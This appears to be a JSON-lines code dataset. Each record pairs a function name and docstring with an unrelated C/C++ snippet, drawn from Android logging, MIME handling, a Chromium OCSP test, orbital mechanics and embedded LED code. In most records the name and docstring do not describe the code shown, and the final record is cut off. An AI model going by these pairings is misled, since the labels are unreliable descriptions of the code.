{"content":"{'function_name': '__android_log_add_transport', 'docstring': '\/* Try to keep one functioning transport for each log buffer id *\/', 'code': \"void __android_log_config_write() {\\n  if ((__android_log_transport == LOGGER_DEFAULT) || (__android_log_transport & LOGGER_LOGD)) {\\n#if (FAKE_LOG_DEVICE == 0)\\n    extern struct android_log_transport_write logdLoggerWrite;\\n    extern struct android_log_transport_write pmsgLoggerWrite;\\n\\n    __android_log_add_transport(&__android_log_transport_write, &logdLoggerWrite);\\n    __android_log_add_transport(&__android_log_persist_write, &pmsgLoggerWrite);\\n#else\\n    extern struct android_log_transport_write fakeLoggerWrite;\\n\\n    __android_log_add_transport(&__android_log_transport_write, &fakeLoggerWrite);\\n#endif\\n  }\\n\\n#if (STDERR_LOG_DEVICE == 1) \/* M3E: we don't have std output *\/\\n  if (__android_log_transport & LOGGER_STDERR) {\\n    extern struct android_log_transport_write stderrLoggerWrite;\\n\\n    \/*\\n     * stderr logger should be primary if we can be the only one, or if\\n     * already in the primary list.  Otherwise land in the persist list.\\n     * Remember we can be called here if we are already initialized.\\n     *\/\\n    if (list_empty(&__android_log_transport_write)) {\\n      __android_log_add_transport(&__android_log_transport_write, &stderrLoggerWrite);\\n    } else {\\n      struct android_log_transport_write* transp;\\n      write_transport_for_each(transp, &__android_log_transport_write) {\\n        if (transp == &stderrLoggerWrite) {\\n          return;\\n        }\\n      }\\n      __android_log_add_transport(&__android_log_persist_write, &stderrLoggerWrite);\\n    }\\n  }\\n#endif \/\/ M3E\\n}\"}","id":1621}
{"content":"{'function_name': 'loop', 'docstring': '\/\/ Send the response to the client', 'code': 'double randomDouble(double minf, double maxf)\\n{\\n  return minf + random(1UL << 31) * (maxf - minf) \/ (1UL << 31);  \/\/ use 1ULL<<63 for max double values)\\n}'}","id":1623}
{"content":"{'function_name': 'MimeOleEscapeStringW', 'docstring': '\/\/ Null term\\r', 'code': 'MIMEOLEAPI MimeOleGetFileExtension(LPCSTR pszFilePath, LPSTR pszExt, ULONG cchMax)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    CHAR        *pszExtT;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    if (NULL == pszFilePath || NULL == pszExt || cchMax < _MAX_EXT)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Locate the extension of the file\\r\\n    pszExtT = PathFindExtension(pszFilePath);\\r\\n    StrCpyN(pszExt, pszExtT, cchMax);\\r\\n\\r\\n    \/\/ Done\\r\\n    return S_OK;\\r\\n}'}","id":1626}
{"content":"{'function_name': 'MimeOleVariantCopy', 'docstring': '\/\/ Success, return vt\\r', 'code': 'HRESULT MimeOleRecurseSetProp(IMimeMessageTree *pTree, HBODY hBody, LPCSTR pszName,\\r\\n    DWORD dwFlags, LPCPROPVARIANT pValue)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n    HRESULT     hrFind;\\r\\n    HBODY       hChild;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    Assert(pTree && hBody && pValue);\\r\\n\\r\\n    \/\/ multipart\/alternative\\r\\n    if (pTree->IsContentType(hBody, STR_CNT_MULTIPART, NULL) == S_OK)\\r\\n    {\\r\\n        \/\/ Get First Child\\r\\n        hrFind = pTree->GetBody(IBL_FIRST, hBody, &hChild);\\r\\n        while(SUCCEEDED(hrFind) && hChild)\\r\\n        {\\r\\n            \/\/ Go down to the child\\r\\n            CHECKHR(hr = MimeOleRecurseSetProp(pTree, hChild, pszName, dwFlags, pValue));\\r\\n\\r\\n            \/\/ Next Child\\r\\n            hrFind = pTree->GetBody(IBL_NEXT, hChild, &hChild);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    \/\/ Otherwise\\r\\n    else\\r\\n    {\\r\\n        \/\/ Go down to the child\\r\\n        CHECKHR(hr = pTree->SetBodyProp(hBody, pszName, dwFlags, pValue));\\r\\n    }\\r\\n\\r\\nexit:\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":1627}
{"content":"{'function_name': 'demosaic_byb_rd4_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaic_byb_rd5_select(demosaic_bx_cache& demosaic_bx, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaic_byb_rd5 read pattern: { demosaic_byb_update_0[d0, d1] -> demosaic_bx[1 + 2d0, 2 + d1] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Read schedule : { demosaic_byb_update_0[d0, d1] -> [5 + d1, 3 + d0, 8] : 0 <= d0 <= 959 and 0 <= d1 <= 1079 }\\n  \/\/ Write schedule: { demosaic_bx_update_0[d0, d1] -> [3 + d1, 3 + d0, 7] : 0 <= d0 <= 959 and 0 <= d1 <= 1081 }\\n  \/\/ DD fold: {  }\\n  auto value_demosaic_bx_demosaic_bx_update_0_write1 = demosaic_bx.demosaic_bx_demosaic_bx_update_0_write1_merged_banks_3.peek_0();\\n  return value_demosaic_bx_demosaic_bx_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1629}
{"content":"{'function_name': 'printListCtrlPacketList', 'docstring': '\/\/g_listctrlPacketListCols = 0;\\t\\t\/\/ \u5217\u590d\u4f4d ', 'code': 'int printEditCtrlPacketData(const Packet & pkt)\\n{\\n\\tif (pkt.isEmpty())\\n\\t{\\n\\t\\treturn -1;\\n\\t}\\n\\tCString strPacketData, strTmp;\\n\\tu_char* pHexPacketData = pkt.pkt_data;\\n\\tu_char* pASCIIPacketData = pkt.pkt_data;\\n\\tfor (int i = 0,  count16=1, offset = 0; i < pkt.header->caplen && pHexPacketData != NULL; ++i, ++count16)\\n\\t{\\n\\t\\t\/\/ \u6253\u5370\u884c\u9996\u504f\u79fb\u91cf\\n\\t\\tif (i % 16 == 0)\\n\\t\\t{\\n\\t\\t\\tstrTmp.Format(\"%04X:\", offset);\\n\\t\\t\\tstrPacketData += strTmp + \" \";\\n\\t\\t}\\n\\n\\t\\t\/\/ \u6253\u537016\u8fdb\u5236\u6570\u636e\\n\\t\\tstrTmp.Format(\"%02X\", *pHexPacketData);\\n\\t\\tstrPacketData += strTmp + \" \";\\n\\t\\t++pHexPacketData;\\n\\n\\t\\t\/\/ \u6bcf8\u4e2a\u5b57\u8282\u6570\u636e\u6253\u5370\u4e00\u4e2a\u5236\u8868\u7b26\\n\\t\\tif (count16 == 8)\\n\\t\\t{\\n\\t\\t\\tstrPacketData += \"\\\\t\";\\n\\t\\t}\\n\\n\\t\\t\/\/ \u6bcf16\u4e2a\u5b57\u8282\u6570\u636e\u6253\u5370ASCII\u5b57\u7b26\u6570\u636e\uff0c\u53ea\u6253\u5370\u5b57\u6bcd\u6570\u5b57\\n\\t\\tif (count16 == 16)\\n\\t\\t{\\n\\t\\t\\tstrPacketData += \" \";\\n\\t\\t\\tfor (int j=0; j < 16; ++j, ++pASCIIPacketData)\\n\\t\\t\\t{\\n\\t\\t\\t\\tstrTmp.Format(\"%c\", isalnum(*pASCIIPacketData) ? *pASCIIPacketData : \\'.\\');\\n\\t\\t\\t\\tstrPacketData += strTmp;\\n\\t\\t\\t}\\n\\t\\t\\tstrPacketData += \"\\\\r\\\\n\";\\n\\t\\t\\toffset += 16;\\n\\t\\t\\tcount16 = 0;\\n\\t\\t}\\n\\t}\\n\\t\/\/ \u6253\u5370\u5269\u4f59ASCII\u5b57\u8282\\n\\tfor (int j = 0, count16= (pkt.header->caplen % 16); j < 16 - (pkt.header->caplen % 16); ++j, ++count16)\\n\\t{\\n\\t\\tstrPacketData += \"   \";\\n\\t\\tif (count16 == 8)\\n\\t\\t{\\n\\t\\t\\tstrPacketData += \"\\\\t\";\\n\\t\\t}\\n\\t}\\n\\tstrPacketData += \" \";\\n\\tfor (int j = 0; j < (pkt.header->caplen % 16); ++j, ++pASCIIPacketData)\\n\\t{\\n\\t\\tstrTmp.Format(\"%c\", isalnum(*pASCIIPacketData) ? *pASCIIPacketData : \\'.\\');\\n\\t\\tstrPacketData += strTmp;\\n\\t}\\n\\tstrPacketData += \"\\\\r\\\\n\";\\n\\t\\n\\tg_pEditCtrlPacketData->SetWindowTextA(strPacketData);\\n\\n\\treturn 0;\\n}'}","id":1631}
{"content":"{'function_name': 'TEST_F', 'docstring': '\/\/ cert, but is still valid for an intermediate.', 'code': 'TEST_F(HTTPSOCSPTest, IntermediateResponseTooOld) {\\n  if (!SystemSupportsOCSP()) {\\n    LOG(WARNING) << \"Skipping test because system doesn\\'t support OCSP\";\\n    return;\\n  }\\n\\n  EmbeddedTestServer::ServerCertificateConfig cert_config;\\n  cert_config.intermediate = EmbeddedTestServer::IntermediateType::kInHandshake;\\n  cert_config.ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::GOOD,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kValid}});\\n  cert_config.intermediate_ocsp_config = EmbeddedTestServer::OCSPConfig(\\n      {{OCSPRevocationStatus::REVOKED,\\n        EmbeddedTestServer::OCSPConfig::SingleResponse::Date::kLonger}});\\n\\n  CertStatus cert_status;\\n  DoConnection(cert_config, &cert_status);\\n\\n  \/\/ The test root is not a known root, therefore the Baseline Requirements\\n  \/\/ limits on maximum age of a response do not apply and the intermediate OCSP\\n  \/\/ response indicating revoked is honored.\\n  EXPECT_EQ(CERT_STATUS_REVOKED, cert_status & CERT_STATUS_ALL_ERRORS);\\n  EXPECT_TRUE(cert_status & CERT_STATUS_REV_CHECKING_ENABLED);\\n}'}","id":1638}
{"content":"{'function_name': 'MimeOleGetBodyPropW', 'docstring': '\/\/ Return the Data\\r', 'code': 'MIMEOLEAPI MimeOleSetBodyPropW(\\r\\n        IMimeMessageTree   *pTree,\\r\\n        HBODY               hBody,\\r\\n        LPCSTR              pszName,\\r\\n        DWORD               dwFlags,\\r\\n        LPCWSTR             pszData)\\r\\n{\\r\\n    \/\/ Invaid Arg\\r\\n    if (NULL == pTree)\\r\\n        return TrapError(E_INVALIDARG);\\r\\n\\r\\n    \/\/ Initialzie PropVariant\\r\\n    PROPVARIANT rVariant;\\r\\n    rVariant.vt = VT_LPWSTR;\\r\\n    rVariant.pwszVal = (LPWSTR)pszData;\\r\\n\\r\\n    \/\/ Call Method\\r\\n    return TrapError(pTree->SetBodyProp(hBody, pszName, dwFlags, &rVariant));\\r\\n}'}","id":1640}
{"content":"{'function_name': 'search', 'docstring': '\/*\\n       printf(\"(%d,%d)=%d\\\\n\", now_i, now_j, S);\\n       for (int i = 1; i <=R; ++i) {\\n       for (int j = 1; j <=C; ++j) {\\n       if (map[i][j]==0) cout <<\"*\";\\n       else cout <<\".\";\\n       }\\n       cout << endl;\\n       }\\n       cout << endl;\\n       *\/', 'code': 'int main(int artc, char* argv[]) {\\n\\n    int TIME;\/\/ number of test\\n    int answer;\/\/ Final answer\\n    int R, C, M;\\n    int map[N][N];\\n    int z_map[N][N];\\n    cin >> TIME;\\n    for (int t = 0 ; t < TIME; t++) {\\n\\tcin >> R >> C >> M;\\n\\tint m_num = R*C;\\n\\tfor (int i = 0 ;i < N; ++i) {\\n\\t    for (int j = 0 ;j < N; ++j) {\\n\\t\\tmap[i][j] = z_map[i][j] = 0;\\n\\t    }\\n\\t}\\n\\n\\t\/\/output\\n\\tprintf(\"Case #%d:\\\\n\",t+1);\\n\\tif (R*C-M==1) {\\n\\t    for (int i = 0 ; i < R; ++i) {\\n\\t\\tfor (int j = 0 ; j < C; ++j) {\\n\\t\\t    if (i==0 && j==0) {\\n\\t\\t\\tcout <<\"c\";\\n\\t\\t    }\\n\\t\\t    else {\\n\\t\\t\\tcout << \"*\";\\n\\t\\t    }\\n\\t\\t}\\n\\t\\tcout << endl;\\n\\t    }\\n\\t    continue;\\n\\t}\\n\\tint r_flag = 0;\\n\\tfirst_click = 1;\\n\\tr_flag = search(map, z_map, 1, 1, R, C, M, R*C-M);\\n\\tif (r_flag == 0) {\\n\\t    cout <<\"Impossible\" << endl;\\n\\t}\\n    }\\n    return 0;\\n}'}","id":1642}
{"content":"{'function_name': 'spell_anim', 'docstring': '\/\/  Task_Add(8196,play_anim,i);\\r', 'code': 'static void spell_vzplanuti2(THE_TIMER *tt) {\\r\\n\\tint ss, ss1, ss2, i, dp, dl, du;\\r\\n\\tint zivel;\\r\\n\\r\\n\\ti = tt->userdata[2];\\r\\n\\r\\n\\tif (i < 1) {\\r\\n\\t\\ti++;\\r\\n\\t}\\r\\n\\r\\n\\tdu = tt->userdata[1] & 0xff;\\r\\n\\tss = tt->userdata[0];\\r\\n\\tzivel = tt->userdata[1] >> 8;\\r\\n\\r\\n\\tif (gameMap.sides()[(ss << 2) + du].flags & SD_PLAY_IMPS) {\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\r\\n\\tss1 = ss2 = ss = gameMap.sectors()[ss].step_next[du];\\r\\n\\r\\n\\tif (ss == 0) {\\r\\n\\t\\treturn;\\r\\n\\t}\\r\\n\\r\\n\\tdp = du + 1 & 3;\\r\\n\\tdl = du + 3 & 3;\\r\\n\\r\\n\\tdo {\\r\\n\\t\\tif (ss1 != 0) {\\r\\n\\t\\t\\tgameMap.addSpecTexture(ss1, H_ARMAGED, H_ARMA_CNT, 1, 0);\\r\\n\\t\\t\\tspell_vzplanuti3(ss1, tt->userdata[3], zivel);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tif (ss2 != ss1 && ss2 != 0) {\\r\\n\\t\\t\\tgameMap.addSpecTexture(ss2, H_ARMAGED, H_ARMA_CNT, 1, 0);\\r\\n\\t\\t\\tspell_vzplanuti3(ss2, tt->userdata[3], zivel);\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tif (~gameMap.sides()[(ss1 << 2) + dp].flags & SD_PLAY_IMPS) {\\r\\n\\t\\t\\tss1 = gameMap.sectors()[ss1].step_next[dp];\\r\\n\\t\\t}\\r\\n\\r\\n\\t\\tif (~gameMap.sides()[(ss2 << 2) + dl].flags & SD_PLAY_IMPS) {\\r\\n\\t\\t\\tss2 = gameMap.sectors()[ss2].step_next[dl];\\r\\n\\t\\t}\\r\\n\\t} while(--i);\\r\\n\\r\\n\\tif (tt->userdata[2]) {\\r\\n\\t\\ttt->userdata[2]++;\\r\\n\\t}\\r\\n\\r\\n\\t\/\/tt->userdata[3]=tt->userdata[3]*2\/3;\\r\\n\\ttt->userdata[0] = ss;\\r\\n}'}","id":1645}
{"content":"{'function_name': 'GetParamsFromFile', 'docstring': '\/\/ file)', 'code': 'int PrintParamsDescription(FILE *out, ParamStruct params[])\\n{\\n  int i=0;\\n\\n  \/\/ print the header (description of information pieces that follow)\\n\\n  printf(\"Configuration file description:\\\\n\\\\n\");\\n  fputs(\"Description                                                Identifier                 Type       Default\\\\n\",out);\\n  printf(\"----------------------------------------------------------------------------------------------------------------\\\\n\");\\n\\n  \/\/ print the description of all parameters\\n\\n  while (params[i].type!=PARAM_END)\\n    {\\n      if (params[i].type==PARAM_DIVIDER)\\n\\tprintf(\"\\\\n\");\\n      else\\n\\tfprintf(out,\"%-58s %-26s %-10s %-8s\\\\n\",params[i].description,params[i].identifier, typeDesc[params[i].type], (params[i].defValue)? params[i].defValue:\"(null)\"); \\n\\t\\n      i++;\\n    }\\n\\n  return 0;\\n}'}","id":1650}
{"content":"{'function_name': 'setColor', 'docstring': '\/\/ Look through the list of colors to find the one that was requested', 'code': 'int ledToggle(String command) {\\n     \/* Particle.functions always take a string as an argument and return an integer.\\n     Since we can pass a string, it means that we can give the program commands on how the function should be used.\\n     In this case, telling the function \"on\" will turn the LED on and telling it \"off\" will turn the LED off.\\n     Then, the function returns a value to us to let us know what happened.\\n     In this case, it will return 1 for the LEDs turning on, 0 for the LEDs turning off,\\n     and -1 if we received a totally bogus command that didn\\'t do anything to the LEDs.\\n     *\/\\n     if (command==\"on\") {\\n         digitalWrite(pinLed,HIGH);\\n         return 1;\\n     }\\n     else if (command==\"off\") {\\n         digitalWrite(pinLed,LOW);\\n         return 0;\\n     }\\n     else {\\n         return -1;\\n     }\\n}'}","id":1652}
{"content":"{'function_name': 'getGridSize', 'docstring': '\/\/Return the size of the grid.', 'code': 'int getFire(void){\\t\\t\/\/Return where to fire.\\n\\treturn fire;\\n}'}","id":1654}
{"content":"{'function_name': 'mee2coe', 'docstring': '\/\/\u8f6c\u6362\u5230[0,2pi)\u4e2d', 'code': 'void rv2ee(int&flag, double* ee, const double* RV, double mu)\\n{\\n\\tflag=0;\\n\\tif(mu<=0.0)\\n\\t\\treturn;\\n\\tint i;\\n\\tdouble R[3]={RV[0], RV[1], RV[2]};\\n\\tdouble V[3]={RV[3], RV[4], RV[5]};\\n\\tdouble radius=V_Norm2(R, 3);\/\/\u8ddd\u79bb\\n\\tdouble velocity=V_Norm2(V, 3);\/\/\u901f\u5ea6\\t\\n\\tdouble unitR[3];\\n\\tfor(i=0;i<3;i++) unitR[i]=R[i]\/radius;\/\/\u5f84\u5411\u5355\u4f4d\u77e2\u91cf    \\n\\tdouble unitV[3];\\n\\tfor(i=0;i<3;i++) unitV[i]=V[i]\/velocity;\/\/\u5207\u5411\u5355\u4f4d\u77e2\u91cf\\n\\tdouble hvector[3];\\n\\tV_Cross(hvector, unitR, unitV);\\n\\tdouble h=radius*velocity*V_Norm2(hvector, 3);\/\/\u89d2\u52a8\u91cf\u503c\\n\\tdouble unith[3];\\n\\tfor(i=0;i<3;i++) unith[i]=hvector[i]\/V_Norm2(hvector, 3);\/\/\u8f68\u9053\u9762\u6cd5\u5411\u5355\u4f4d\u77e2\u91cf\\n\\t\\n\\t\/\/ unith=[sin(i)*sin(OMEGA),\\n\\t\/\/       -sin(i)*cos(OMEGA),\\n\\t\/\/       cos(i)];\\n\\t\/\/\u504f\u5fc3\u7387\u77e2\u91cf\\t\\n\\tdouble evector[3];\\n\\tV_Cross(evector, unitV, unith);\\n\\tfor(i=0;i<3;i++) evector[i]=(velocity*h\/mu)*evector[i]-unitR[i];\\t\\n\\t\/\/\u534a\u80fd\u5f84\u65b9\u5411\u77e2\u91cf,\u6a21\u4e3ae\\n\\tdouble qvector[3];\\n\\tV_Cross(qvector,unith,evector);\\n\\t\/\/\u5b9a\u4e49\u7684\u4e00\u4e2a\u77e2\u91cf\\n\\tdouble unitA[3];\\n\\tfor(i=0;i<3;i++) unitA[i]=h\/mu*V[i]-qvector[i];\\n\\t\/\/\u57fa\u672c\u5173\u7cfb\u5f0f\\n\\t\/\/ evector=e*[cos(omega)*cos(OMEGA)-sin(omega)*sin(OMEGA)*cos(i),\\n\\t\/\/            cos(omega)*sin(OMEGA)+sin(omega)*cos(OMEGA)*cos(i),\\n\\t\/\/            sin(omega)*sin(i)];\\n\\t\/\/ qvector=e*[-sin(omega)*cos(OMEGA)-cos(omega)*sin(OMEGA)*cos(i),\\n\\t\/\/            -sin(omega)*sin(OMEGA)+cos(omega)*cos(OMEGA)*cos(i),\\n\\t\/\/            cos(omega)*sin(i)];\\n\\t\/\/ unitR=[cos(OMEGA)*cos(omega+f)-cos(i)*sin(OMEGA)*sin(omega+f),\\n\\t\/\/        sin(OMEGA)*cos(omega+f)+cos(i)*cos(OMEGA)*sin(omega+f),\\n\\t\/\/        sin(i)*sin(omega+f)];\\n\\t\/\/ unitA=[-cos(OMEGA)*sin(omega+f)-cos(i)*sin(OMEGA)*cos(omega+f),\\n\\t\/\/        -sin(OMEGA)*sin(omega+f)+cos(i)*cos(OMEGA)*cos(omega+f),\\n\\t\/\/         sin(i)*cos(omega+f)];\\n\\t\/\/\u63a8\u5bfc\u5f97\u51fa\\n\\t\/\/evector[0]+qvector[1]=(1+cos(i))*e*cos(omega+OMEGA);\\n\\t\/\/evector[1]-qvector[0]=(1+cos(i))*e*sin(omega+OMEGA);\\n\\t\/\/unith[0]=(1+cos(i))*tan(i\/2)*sin(OMEGA);\\n\\t\/\/unith[1]=-(1+cos(i))*tan(i\/2)*cos(OMEGA);\\n\\t\/\/ unitR[0]+unitA[1]=(1+cos(i))*cos(omega+OMEGA+f);\\n\\t\/\/ unitR[1]-unitA[0]=(1+cos(i))*sin(omega+OMEGA+f);\\n\\n\\tee[0]=h*h\/mu;\/\/p\\n\\n\\tif(unith[2]+1.0<=0.0)\\n\\t{\\n\/\/\\t\\tcout<<\"\u8f68\u9053\u503e\u89d2\u63a5\u8fd1180\u5ea6\uff0c\u4e0d\u9002\u5408\u7528\u5929\u7403\u8f68\u9053\u6839\u6570\u63cf\u8ff0. \"<<endl;\\n\\t\\treturn;\\n\\t}\\n\\tdouble cosiadd1=1.0+unith[2];\\n\\tee[1]=(evector[0]+qvector[1])\/cosiadd1;\/\/f\\n\\tee[2]=(evector[1]-qvector[0])\/cosiadd1;\/\/g\\n\\tee[3]=-unith[1]\/cosiadd1;\/\/h\\n\\tee[4]=unith[0]\/cosiadd1;\/\/k\\n\\tee[5]=atan2(unitR[1]-unitA[0],unitR[0]+unitA[1]);\/\/L\\n\\t\/\/\u8f6c\u6362\u5230[0,2pi)\u4e2d\\n\\tee[5]=fmod(ee[5], D2PI);\\n\\tif(ee[5]<0.0)\\n\\t\\tee[5]+=D2PI;\\n\\tflag=1;\\n\\treturn;\\n}'}","id":1660}
{"content":"{'function_name': 'compute_clnd', 'docstring': '\/\/ First look for [N-]#[N+]=N because they count for 1 each (why I have no idea).', 'code': 'static int\\ndo_reflect_coordinates (Molecule & m)\\n{\\n  if (m.highest_coordinate_dimensionality() < 3)\\n  {\\n    cerr << \"do_reflect_coordinates:inadequate dimensionality \" << m.highest_coordinate_dimensionality() << \", \\'\" << m.name() << \"\\'\\\\n\";\\n    return 0;\\n  }\\n\\n\/\/coord_t xmin, xmax, ymin, ymax, zmin, zmax;\\n\/\/m.spatial_extremeties (xmin, xmax, ymin, ymax, zmin, zmax);\\n\\n  const auto matoms = m.natoms();\\n\\n\/\/m.translate_atoms(0.0, 0.0, -zmin);    \/\/ ensure all on one side of xy plane\\n\\n  for (auto i = 0; i < matoms; ++i)\\n  {\\n    Coordinates c;\\n    m.get_coords(i, c);\\n    m.setxyz(i, -c.x(), -c.y(), -c.z());\\n  }\\n\\n\/\/m.translate_atoms(0.0, 0.0, zmin);\\n\\n  return do_invert_all_chiral_centres(m);\\n}'}","id":1662}
{"content":"{'function_name': 'loop', 'docstring': '\/\/ listen for incoming clients', 'code': 'int setPixelColor(String rgb) {\\n  int beginningIndex = 0;\\n  int colorIndex = 0;\\n  while (rgb.indexOf(\",\", beginningIndex) != -1) {\\n    int index = rgb.indexOf(\",\", beginningIndex);\\n    Serial.println(rgb.substring(beginningIndex, index));\\n    color[colorIndex] = rgb.substring(beginningIndex, index).toInt();\\n    beginningIndex = index + 1;\\n    colorIndex++;\\n  }\\n  color[colorIndex] = rgb.substring(beginningIndex, rgb.length()).toInt();\\n\\n  FastLED.show();\\n  \/\/ set single pixel color\\n  return 1;\\n}'}","id":1666}
{"content":"{'function_name': 'find_t10', 'docstring': '\/\/ how did we get here?\\r', 'code': 'int main()\\r\\n{\\r\\n\\r\\n  cout << \"start\" << endl;\\r\\n\\r\\n  \/\/ read in your data\\r\\n  ifstream  data(\"dummy2.csv\");\\r\\n  map<int,long long> m;\\r\\n  string line;\\r\\n  while(getline(data,line))\\r\\n  {\\r\\n    stringstream   lineStream(line);\\r\\n    string         cell;\\r\\n    vector<string> result;\\r\\n    while(getline(lineStream,cell,\\',\\'))\\r\\n    {\\r\\n      result.push_back(cell.c_str());\\r\\n    }\\r\\n\\r\\n    if (result.size()==2)\\r\\n    {\\r\\n      \/\/ strip the last three digits from the string\\r\\n      result[0].erase(result[0].length()-3);\\r\\n      m[stoi(result[0])] = stoll(result[1]);\\r\\n    }\\r\\n    else\\r\\n    {\\r\\n      cout << \"ERROR, ERRROR, ERRROR\\\\n\";\\r\\n      return 1;\\r\\n    }\\r\\n\\r\\n  }\\r\\n\\r\\n  \/\/ show that it is sensible\\r\\n  for( map<int,long long>::iterator itr = m.begin(); itr != m.end(); itr++ )\\r\\n  {\\r\\n    cout << itr->first << \" -> \" << itr->second << \\'\\\\n\\';\\r\\n  }\\r\\n\\r\\n  \/\/ let\\'s test our find function\\r\\n  vector<int> timestamps;\\r\\n  timestamps.push_back(1463292000); \/\/ <-- before beginning\\r\\n  timestamps.push_back(1463292010);\\r\\n  timestamps.push_back(1463292378);\\r\\n  timestamps.push_back(1463292132);\\r\\n  timestamps.push_back(1463292095);\\r\\n  timestamps.push_back(1470895189);\\r\\n  timestamps.push_back(1470895190);\\r\\n  for( vector<int>::iterator itr = timestamps.begin(); itr != timestamps.end(); ++itr )\\r\\n  {\\r\\n    cout << \"find value \" << *itr << \\'\\\\n\\';\\r\\n    long long t10 = find_t10(*itr, m );\\r\\n    cout << \"T10 for \" << *itr << \" is: \" << t10 << \\'\\\\n\\';\\r\\n  }\\r\\n\\r\\n  return 0;\\r\\n}'}","id":1668}
{"content":"{'function_name': 'GetDeviceFromIndex', 'docstring': '\/\/get context of open device via index 0,1,2,...', 'code': 'AMF_RESULT CreateCommandQueuesWithCUcount(int deviceIndex, cl_command_queue *pcmdQueue1, cl_command_queue *pcmdQueue2, int Q1CUcount, int Q2CUcount)\\n{\\n    cl_int err = 0;\\n    cl_device_id device = NULL;\\n    cl_context context = NULL;\\n\\n    cl_device_partition_property props[] = {\\n        CL_DEVICE_PARTITION_BY_COUNTS,\\n        Q2CUcount,\\n        Q1CUcount,\\n        CL_DEVICE_PARTITION_BY_COUNTS_LIST_END,\\n        0\\n        }; \/\/ count order seems reversed!\\n\\n    GetDeviceFromIndex(deviceIndex, &device, &context, CL_DEVICE_TYPE_CPU); \/\/ only implemented for CPU\\n\\n    cl_device_id outdevices[2] = {NULL, NULL};\\n\\n    err = clCreateSubDevices(\\n        device,\\n        props,\\n        2,\\n        outdevices,\\n        NULL\\n        );\\n    AMF_RETURN_IF_CL_FAILED(err);\\n\\n    *pcmdQueue1 = clCreateCommandQueue(context, outdevices[0], NULL, &err);\\n    AMF_RETURN_IF_CL_FAILED(err);\\n\\n    printf(\"\\\\r\\\\nUTILS: OpenCL queue created: 0x%llX, error code: %d\\\\r\\\\n\", *pcmdQueue1, err);\\n\\n    *pcmdQueue2 = clCreateCommandQueue(context, outdevices[1], NULL, &err);\\n    AMF_RETURN_IF_CL_FAILED(err);\\n\\n    printf(\"\\\\r\\\\nUTILS: OpenCL queue created: 0x%llX, error code: %d\\\\r\\\\n\", *pcmdQueue2, err);\\n\\n    return AMF_OK;\\n}'}","id":1669}
{"content":"{'function_name': 'RestoreScale', 'docstring': '\/\/*\/', 'code': 'EXPORT void CALL FBGetFrameBufferInfo(void *p)\\n{\\n  VLOG (\"FBGetFrameBufferInfo ()\\\\n\");\\n  FrameBufferInfo * pinfo = (FrameBufferInfo *)p;\\n  memset(pinfo,0,sizeof(FrameBufferInfo)*6);\\n  if (!(settings.frame_buffer&fb_get_info))\\n    return;\\n  LRDP(\"FBGetFrameBufferInfo ()\\\\n\");\\n  \/\/*\\n  if (fb_emulation_enabled)\\n  {\\n    pinfo[0].addr   = rdp.maincimg[1].addr;\\n    pinfo[0].size   = rdp.maincimg[1].size;\\n    pinfo[0].width  = rdp.maincimg[1].width;\\n    pinfo[0].height = rdp.maincimg[1].height;\\n    int info_index = 1;\\n    for (int i = 0; i < rdp.num_of_ci && info_index < 6; i++)\\n    {\\n      COLOR_IMAGE & cur_fb = rdp.frame_buffers[i];\\n      if (cur_fb.status == ci_main || cur_fb.status == ci_copy_self ||\\n        cur_fb.status == ci_old_copy)\\n      {\\n        pinfo[info_index].addr   = cur_fb.addr;\\n        pinfo[info_index].size   = cur_fb.size;\\n        pinfo[info_index].width  = cur_fb.width;\\n        pinfo[info_index].height = cur_fb.height;\\n        info_index++;\\n      }\\n    }\\n  }\\n  else\\n  {\\n    pinfo[0].addr   = rdp.maincimg[0].addr;\\n    pinfo[0].size   = rdp.ci_size;\\n    pinfo[0].width  = rdp.ci_width;\\n    pinfo[0].height = rdp.ci_width*3\/4;\\n    pinfo[1].addr   = rdp.maincimg[1].addr;\\n    pinfo[1].size   = rdp.ci_size;\\n    pinfo[1].width  = rdp.ci_width;\\n    pinfo[1].height = rdp.ci_width*3\/4;\\n  }\\n  \/\/*\/\\n}'}","id":1675}
{"content":"{'function_name': 'EnumerateStiDevicesWithCallback', 'docstring': '\/*  TDB:  Find out who calls this and convert them over to CWiaDevMan\\r\\n    if (!g_fDeviceListInitialized) {\\r\\n        STIMONWPRINTF(TEXT(\"Device list not initialized\"));\\r\\n        return;\\r\\n    }\\r\\n\\r\\n    if (!pfn) {\\r\\n        ASSERT((\"Incorrect callback\", 0));\\r\\n        return;\\r\\n    }\\r\\n\\r\\n    HRESULT hres;\\r\\n\\r\\n    PSTI_DEVICE_INFORMATION pDevInfo;\\r\\n\\r\\n    PVOID   pBuffer;\\r\\n\\r\\n    UINT    iDev;\\r\\n    DWORD   dwItemsReturned;\\r\\n\\r\\n    \/\/\\r\\n    \/\/ Enumerate STI devices\\r\\n    \/\/\\r\\n\\r\\n    hres = g_pSti->GetDeviceList(0,                 \/\/ Type\\r\\n                                 FLAG_NO_LPTENUM,   \/\/ Flags\\r\\n                                 &dwItemsReturned,\\r\\n                                 &pBuffer);\\r\\n\\r\\n    if (!SUCCEEDED(hres) || !pBuffer) {\\r\\n        DBG_ERR((\"Enumeration call failed - abort. HRes=%x \\\\n\",hres));\\r\\n        goto Cleanup;\\r\\n    }\\r\\n\\r\\n    DBG_TRC((\"EnumerateStiDevicesWithCallback, returned from 